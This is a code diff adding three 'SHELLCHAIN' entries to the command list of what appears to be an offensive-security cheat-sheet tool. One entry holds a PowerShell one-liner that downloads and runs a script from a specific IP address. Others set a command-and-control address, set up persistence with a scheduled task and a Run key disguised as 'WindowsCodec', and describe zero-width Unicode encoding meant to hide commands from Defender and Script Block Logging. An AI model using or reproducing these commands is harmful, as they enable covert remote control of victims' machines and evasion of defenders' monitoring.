@@ -4897,6 +4897,31 @@ const COMMANDS = [
   },
 
   // ═══════════════════════════════════════════════════════════════
+  // SHELLCHAIN - 5-Layer Obfuscated Implant
+  // ═══════════════════════════════════════════════════════════════
+  {
+    title: "[SHELLCHAIN] Quick Test Shell",
+    desc: "TESTED: Works with Defender ON. Simple version without persistence.",
+    code: "# VPS: python3 /opt/nc.py 7777\n\n# Target:\nIEX(IWR http://168.144.166.97:8889/shellchain_test.ps1 -UseBasicParsing)\n\n# Full repo: github.com/rainfantry/shellchain",
+    tags: ["ps", "c2", "evasion", "playbook"],
+    accent: "#00ff41"
+  },
+  {
+    title: "[SHELLCHAIN] Full Install (Persistence)",
+    desc: "Full 5-layer implant with scheduled task + registry persistence.",
+    code: "# 1. Set C2 IP:\n$env:C2_IP = '168.144.166.97'\n$env:C2_PORT = '4444'\n\n# 2. Run stage5.ps1 - creates persistence:\n#    - %APPDATA%\\unicode\\ folder\n#    - Scheduled task 'Unicode'\n#    - Registry Run key 'WindowsCodec'\n\n# 3. Cleanup:\nUnregister-ScheduledTask -TaskName 'Unicode' -Confirm:$false\nRemove-Item \"$env:APPDATA\\unicode\" -Recurse -Force\nRemove-ItemProperty HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -Name WindowsCodec",
+    tags: ["ps", "c2", "persist", "evasion"],
+    accent: "#9b59b6"
+  },
+  {
+    title: "[SHELLCHAIN] Stego Command Encoding",
+    desc: "Commands encoded as invisible Unicode (U+200B/U+200D). Defeats Script Block Logging.",
+    code: "# Zero-width steganography:\n# U+200B = 0, U+200D = 1\n# text -> UTF-16 LE -> base64 -> 16-bit binary per char -> invisible chars\n\n# ~512K invisible chars = ~30KB payload\n# PowerShell logs show empty string, actual command hidden",
+    tags: ["ps", "evasion", "code"],
+    accent: "#9b59b6"
+  },
+
+  // ═══════════════════════════════════════════════════════════════
   // FULL TOOL CODE - ANNOTATED
   // ═══════════════════════════════════════════════════════════════
   {
